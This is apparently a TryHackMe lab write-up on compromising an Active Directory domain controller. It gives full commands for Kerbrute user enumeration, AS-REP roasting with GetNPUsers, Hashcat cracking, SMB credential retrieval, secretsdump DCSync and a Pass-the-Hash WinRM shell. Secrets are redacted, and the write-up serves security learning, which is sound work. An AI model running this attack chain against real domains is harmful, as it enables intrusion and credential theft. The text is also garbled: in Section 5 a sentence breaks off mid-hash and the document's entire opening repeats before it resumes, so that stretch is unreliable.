# Attacktive Directory — TryHackMe

## Overview

In this lab, I enumerated an Active Directory domain, identified an account with Kerberos pre-authentication disabled, and cracked its AS-REP material offline. I then accessed an SMB share containing credentials for the `backup` account, used those credentials to extract domain account hashes, and authenticated as Administrator through Pass-the-Hash.

**Attack chain:** Domain enumeration → AS-REP Roasting → Offline password cracking → SMB credential discovery → DCSync (as explained in the TryHackMe task) → Administrator access through Pass-the-Hash.

> This writeup combines several sessions of the same lab. Target IPs changed between sessions; the commands retain the IPs used at the time. When repeating the lab, use the IP assigned to the current session.

## 1. Port Scanning

I used Nmap with `-Pn` to identify open ports on the lab target. The `-Pn` option skips host discovery and treats the target as online. One of the ports I found was **389 (LDAP)**.

LDAP is used to query directory information, so I chose to investigate it for details about the target's domain.

### Scan Results (Later Session)

```text
Nmap scan report for 10.145.149.203
Host is up (0.039s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

The combination of Kerberos (`88`), LDAP (`389`), SMB (`445`), and Global Catalog (`3268`/`3269`) is consistent with an Active Directory domain controller. These services provide useful starting points for domain enumeration. The service names above are Nmap's port labels, not confirmed software versions.

## 2. LDAP Enumeration

I used `ldapsearch` to query the LDAP service and found the following attribute:

```text
ldapServiceName: spookysec.local:attacktivedirec$@SPOOKYSEC.LOCAL
```

This gave me the following information:

| Value | Meaning |
| --- | --- |
| `spookysec.local` | Domain name |
| `attacktivedirec$` | Computer account name |
| `SPOOKYSEC.LOCAL` | Kerberos realm |

The domain name is useful for later domain enumeration and authentication-related commands.

### Command Used

```bash
ldapsearch -x -H ldap://10.146.158.66 -b "" -s base
```

- `-x`: use simple authentication instead of SASL; with no credentials supplied, this is an anonymous query.
- `-H`: specify the LDAP server URL.
- `-b ""`: use an empty search base to query the RootDSE.
- `-s base`: query only the base entry.

This queries the server’s RootDSE for basic directory information; it does not enumerate all domain users.

## 3. Username Enumeration with Kerbrute

I used Kerbrute with `userlist.txt`, a username wordlist provided by TryHackMe, to identify valid usernames in the `spookysec.local` domain.

Kerbrute checks candidate usernames through Kerberos. Finding valid usernames gives me accounts to investigate in the next steps.

### Interesting Results

The results included the following usernames:

```text
svc-admin@spookysec.local
backup@spookysec.local
Administrator@spookysec.local
administrator@spookysec.local
```

`Administrator` and `administrator` normally refer to the same AD account because usernames are case-insensitive.

The name `svc-admin` suggests a possible service account, but the name alone does not confirm its purpose or privileges.

The `backup` username provided another lead for investigation. At this stage, its name alone did not establish its purpose or privileges.

### Command Used

```bash
~/go/bin/kerbrute userenum -d spookysec.local --dc 10.146.158.66 userlist.txt -o valid-users.log
```

- `userenum`: enumerate valid usernames.
- `-d spookysec.local`: specify the target domain.
- `--dc 10.146.158.66`: specify the domain controller.
- `userlist.txt`: provide the candidate username wordlist.
- `-o valid-users.log`: save Kerbrute's log output to a file.

### Troubleshooting: Executable Path

I initially tried `./kerbrute`, but received `zsh: no such file or directory: ./kerbrute`. The `./` prefix refers to the current directory, while my Kerbrute executable was located in `~/go/bin/`.

I resolved this by running `~/go/bin/kerbrute` instead. I did not need to change directories because I supplied the executable's path.

## 4. AS-REP Roasting Check with GetNPUsers

I used Impacket's `GetNPUsers` to check whether any accounts in `userlist.txt` had Kerberos pre-authentication disabled.

For accounts with this setting, the domain controller can return an AS-REP without requiring the account's password. Part of that response can be used for offline password cracking. This technique is called **AS-REP Roasting**.

### Command Used

```bash
impacket-GetNPUsers -no-pass spookysec.local/ -usersfile userlist.txt -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
```

- `-no-pass`: do not prompt for a password.
- `spookysec.local/`: specify the target domain without supplying a username after the slash.
- `-usersfile userlist.txt`: check the candidate usernames in this file.
- `-dc-ip 10.146.158.66`: specify the domain controller's IP address.
- `-format hashcat`: format any collected AS-REP cracking material for Hashcat.
- `-outputfile asrep.txt`: save any collected AS-REP cracking material to this file.

### Targeted Check: svc-admin

Checking the entire `userlist.txt` was taking too long, so I switched to checking `svc-admin`, one of the valid usernames found with Kerbrute.

```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
```

Unlike the earlier command with `-usersfile`, this command targets a single account: `svc-admin`.

### Results

The command returned AS-REP cracking material for `svc-admin`:

```text
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<checksum>:<encrypted-data>
```

The checksum and encrypted data are abbreviated here for readability. The command uses `asrep.txt` as the output file for the full value.

This confirms that `svc-admin` has Kerberos pre-authentication disabled. I obtained an AS-REP hash suitable for offline password cracking, not the plaintext password. The subsequent cracking attempt is documented in Section 6.


## 5. Identifying the Hashcat Mode

After searching online, I identified the Hashcat mode for the collected AS-REP hash:

| Hashcat Mode | Hash Type |
| --- | --- |
| `18200` | Kerberos 5, etype 23, AS-REP |

The hash began with `$krb5asrep$23# Attacktive Directory — TryHackMe

## Overview

In this lab, I enumerated an Active Directory domain, identified an account with Kerberos pre-authentication disabled, and cracked its AS-REP material offline. I then accessed an SMB share containing credentials for the `backup` account, used those credentials to extract domain account hashes, and authenticated as Administrator through Pass-the-Hash.

**Attack chain:** Domain enumeration → AS-REP Roasting → Offline password cracking → SMB credential discovery → DCSync (as explained in the TryHackMe task) → Administrator access through Pass-the-Hash.

> This writeup combines several sessions of the same lab. Target IPs changed between sessions; the commands retain the IPs used at the time. When repeating the lab, use the IP assigned to the current session.

## 1. Port Scanning

I used Nmap with `-Pn` to identify open ports on the lab target. The `-Pn` option skips host discovery and treats the target as online. One of the ports I found was **389 (LDAP)**.

LDAP is used to query directory information, so I chose to investigate it for details about the target's domain.

### Scan Results (Later Session)

```text
Nmap scan report for 10.145.149.203
Host is up (0.039s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

The combination of Kerberos (`88`), LDAP (`389`), SMB (`445`), and Global Catalog (`3268`/`3269`) is consistent with an Active Directory domain controller. These services provide useful starting points for domain enumeration. The service names above are Nmap's port labels, not confirmed software versions.

## 2. LDAP Enumeration

I used `ldapsearch` to query the LDAP service and found the following attribute:

```text
ldapServiceName: spookysec.local:attacktivedirec$@SPOOKYSEC.LOCAL
```

This gave me the following information:

| Value | Meaning |
| --- | --- |
| `spookysec.local` | Domain name |
| `attacktivedirec$` | Computer account name |
| `SPOOKYSEC.LOCAL` | Kerberos realm |

The domain name is useful for later domain enumeration and authentication-related commands.

### Command Used

```bash
ldapsearch -x -H ldap://10.146.158.66 -b "" -s base
```

- `-x`: use simple authentication instead of SASL; with no credentials supplied, this is an anonymous query.
- `-H`: specify the LDAP server URL.
- `-b ""`: use an empty search base to query the RootDSE.
- `-s base`: query only the base entry.

This queries the server’s RootDSE for basic directory information; it does not enumerate all domain users.

## 3. Username Enumeration with Kerbrute

I used Kerbrute with `userlist.txt`, a username wordlist provided by TryHackMe, to identify valid usernames in the `spookysec.local` domain.

Kerbrute checks candidate usernames through Kerberos. Finding valid usernames gives me accounts to investigate in the next steps.

### Interesting Results

The results included the following usernames:

```text
svc-admin@spookysec.local
backup@spookysec.local
Administrator@spookysec.local
administrator@spookysec.local
```

`Administrator` and `administrator` normally refer to the same AD account because usernames are case-insensitive.

The name `svc-admin` suggests a possible service account, but the name alone does not confirm its purpose or privileges.

The `backup` username provided another lead for investigation. At this stage, its name alone did not establish its purpose or privileges.

### Command Used

```bash
~/go/bin/kerbrute userenum -d spookysec.local --dc 10.146.158.66 userlist.txt -o valid-users.log
```

- `userenum`: enumerate valid usernames.
- `-d spookysec.local`: specify the target domain.
- `--dc 10.146.158.66`: specify the domain controller.
- `userlist.txt`: provide the candidate username wordlist.
- `-o valid-users.log`: save Kerbrute's log output to a file.

### Troubleshooting: Executable Path

I initially tried `./kerbrute`, but received `zsh: no such file or directory: ./kerbrute`. The `./` prefix refers to the current directory, while my Kerbrute executable was located in `~/go/bin/`.

I resolved this by running `~/go/bin/kerbrute` instead. I did not need to change directories because I supplied the executable's path.

## 4. AS-REP Roasting Check with GetNPUsers

I used Impacket's `GetNPUsers` to check whether any accounts in `userlist.txt` had Kerberos pre-authentication disabled.

For accounts with this setting, the domain controller can return an AS-REP without requiring the account's password. Part of that response can be used for offline password cracking. This technique is called **AS-REP Roasting**.

### Command Used

```bash
impacket-GetNPUsers -no-pass spookysec.local/ -usersfile userlist.txt -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
```

- `-no-pass`: do not prompt for a password.
- `spookysec.local/`: specify the target domain without supplying a username after the slash.
- `-usersfile userlist.txt`: check the candidate usernames in this file.
- `-dc-ip 10.146.158.66`: specify the domain controller's IP address.
- `-format hashcat`: format any collected AS-REP cracking material for Hashcat.
- `-outputfile asrep.txt`: save any collected AS-REP cracking material to this file.

### Targeted Check: svc-admin

Checking the entire `userlist.txt` was taking too long, so I switched to checking `svc-admin`, one of the valid usernames found with Kerbrute.

```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
```

Unlike the earlier command with `-usersfile`, this command targets a single account: `svc-admin`.

### Results

The command returned AS-REP cracking material for `svc-admin`:

```text
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<checksum>:<encrypted-data>
```

The checksum and encrypted data are abbreviated here for readability. The command uses `asrep.txt` as the output file for the full value.

This confirms that `svc-admin` has Kerberos pre-authentication disabled. I obtained an AS-REP hash suitable for offline password cracking, not the plaintext password. The subsequent cracking attempt is documented in Section 6.


## 5. Identifying the Hashcat Mode

After searching online, I identified the Hashcat mode for the collected AS-REP hash:

| Hashcat Mode | Hash Type |
| --- | --- |
| `18200` | Kerberos 5, etype 23, AS-REP |

, which identified mode `18200` as the appropriate choice for the cracking attempt.

The cracking command and result are documented in Section 6.

## 6. Offline Password Cracking with Hashcat

I cracked the AS-REP hash using Hashcat and `paswordlist.txt`, a password wordlist downloaded from TryHackMe. The filename below matches the file I used.

### Command Used

```bash
hashcat -m 18200 -a 0 asrep.txt paswordlist.txt
```

- `-m 18200`: select Kerberos 5, etype 23, AS-REP.
- `-a 0`: use a dictionary attack.
- `asrep.txt`: read the collected AS-REP hash.
- `paswordlist.txt`: supply candidate passwords.

### Results

Hashcat successfully recovered the password for `svc-admin`. The password is omitted from this published writeup.

```text
<AS-REP hash>:[REDACTED]
```

Hashcat does not modify the input file `asrep.txt` by default; it normally stores recovered results in its potfile. The trailing password in a `<hash>:<password>` result is not part of the original AS-REP hash.

This was an offline dictionary attack against the captured AS-REP material. The recovered credentials were subsequently used for SMB share enumeration, documented in Section 7.

## 7. SMB Share Enumeration with smbclient

I used `smbclient` with the `svc-admin` credentials to list the SMB shares on the lab target. This session used target IP `10.145.187.119`.

### Command Used

```bash
smbclient -L //10.145.187.119 -U svc-admin
```

- `-L`: list the shares available on the server.
- `//10.145.187.119`: specify the target server.
- `-U svc-admin`: specify the username; smbclient prompts for the password.

This command lists shares rather than opening an interactive connection to a specific share. The returned share list can help identify which shares to investigate next.

### Results

The server returned the following shares:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

The `backup` share caught my attention because I had previously identified a username named `backup` with Kerbrute. The matching names provide a lead to investigate, but do not prove that the account owns or can access this share.

The share listing succeeded using the supplied credentials. Listing a share does not establish permission to read its contents.

### SMB1 Workgroup Listing Message

After returning the shares, smbclient printed:

```text
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.145.187.119 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

This error occurred during the subsequent SMB1 workgroup-listing attempt. It does not invalidate the share list already returned and does not mean the earlier password authentication failed.

The successful connection and directory listing are documented in Section 8.


## 8. Accessing the backup Share

After listing the shares with `-L`, I connected directly to the `backup` share using the same `svc-admin` account. I removed `-L` and added `/backup` to the server path.

`backup` is the share name, not the account I authenticated as.

### Commands Used

```bash
smbclient //10.145.187.119/backup -U svc-admin
```

After entering the password, I received an interactive SMB prompt and listed the share's contents:

```text
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 12:08:39 2020
  ..                                  D        0  Sat Apr  4 12:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 12:08:53 2020
```

### Findings

The successful connection and directory listing confirmed that `svc-admin` could access the share and list its contents. I found `backup_credentials.txt`, a 48-byte file whose name suggests it may contain credentials. The subsequent local inspection is documented in Section 9.

## 9. Recovering backup Credentials

I initially tried to use `cat` inside the interactive `smbclient` console, but it is not an smbclient command. I downloaded the file instead:

```text
smb: \> get backup_credentials.txt
```

The `get` command copied the remote file to my local working directory. I then inspected it locally and found a Base64-encoded string.

Base64 is an encoding, not encryption: it can be decoded without a secret key. After decoding the string, I recovered credentials for the `backup` account:

```text
backup@spookysec.local:[REDACTED]
```

Both the encoded string and the recovered password are omitted because the string itself reveals the credentials when decoded. I used the recovered credentials with `secretsdump` in the next step.

## 10. Extracting Domain Hashes with Impacket secretsdump

After recovering the `backup` account credentials, I used Impacket's `secretsdump` against the lab domain controller. This session used target IP `10.145.161.193`.

### Command Used (Password Redacted)

```bash
impacket-secretsdump 'spookysec.local/backup:<REDACTED_PASSWORD>@10.145.161.193'
```

The target argument follows the structure `domain/username:password@target`. The password above is a placeholder for the recovered lab password.

### Results

The output included an entry for the Administrator account:

```text
Administrator:500:<LM_HASH_REDACTED>:<NT_HASH_REDACTED>:::
```

The fields shown are `username:RID:LM hash:NT hash`. `500` is the Administrator account's relative identifier (RID); the fourth field contains its NT hash, not its plaintext password.

### Why the backup Account Could Extract Hashes

According to the TryHackMe task description, the `backup` account had permission to replicate domain data, including password hashes. DCSync abuses these replication permissions to request credential data from a domain controller.

This explains why the recovered credentials were useful beyond accessing a file share: the account's replication permissions allowed access to domain credential material. The privileges came from its assigned permissions, not from the account name.

The lab explanation identifies this step as DCSync. My recorded output confirms that I obtained the Administrator hash; I did not independently enumerate the account's replication permissions or preserve the output identifying the extraction method.

I used the Administrator NT hash for the remote connection documented in Section 11.

## 11. Administrator Remote PowerShell Session via Pass-the-Hash

After obtaining the Administrator account's NT hash, I used `evil-winrm-py` to authenticate over WinRM with the hash instead of a plaintext password. This technique is called **Pass-the-Hash**. This lab session used target IP `10.145.143.40`.

### Command Used (Hash Redacted)

```bash
evil-winrm-py -i 10.145.143.40 -u Administrator -H <REDACTED_NT_HASH>
```

- `-i`: specify the target IP address.
- `-u Administrator`: specify the account to authenticate as.
- `-H`: supply the account's NT hash.

### Results

The connection succeeded and provided an interactive remote PowerShell session. I ran `ls` at the following prompt:

```text
evil-winrm-py PS C:\Users\Administrator\Documents> ls
```

This records a successful remote shell connection using the Administrator account's hash. Pass-the-Hash uses the hash for authentication; it does not recover the plaintext password.

## 12. Locating the Lab Flags

After obtaining the remote PowerShell session, I located the following lab flags and files:

| Account | Location | Finding |
| --- | --- | --- |
| `Administrator` | `C:\Users\Administrator\Desktop\root.txt` | Administrator flag |
| `backup` | `C:\Users\backup\Desktop\PrivEsc.txt` | File named `PrivEsc.txt` |
| `svc-admin` | `C:\Users\svc-admin\Desktop\user.txt.txt` | svc-admin flag |

Flag values are omitted from this writeup. I have not yet documented the contents of `PrivEsc.txt`, so its purpose is not inferred from its name alone.

## What I Learned

- **Enumeration builds the attack path.** Nmap identified services worth investigating, LDAP revealed the domain name, and Kerbrute identified valid usernames.
- **A valid username is not a password.** Kerbrute provided accounts to check; GetNPUsers returned AS-REP material for an account with pre-authentication disabled.
- **AS-REP Roasting and password cracking are separate steps.** Collecting AS-REP material enabled an offline dictionary attack; Hashcat recovered the password.
- **Encoding does not protect credentials.** The Base64-encoded file exposed the `backup` account's credentials once decoded.
- **Permissions determine impact.** As explained in the TryHackMe task, the `backup` account's replication permissions enabled DCSync and access to domain password hashes.
- **Pass-the-Hash does not require recovering the plaintext password.** I used the Administrator NT hash to authenticate through WinRM and obtain a remote PowerShell session.
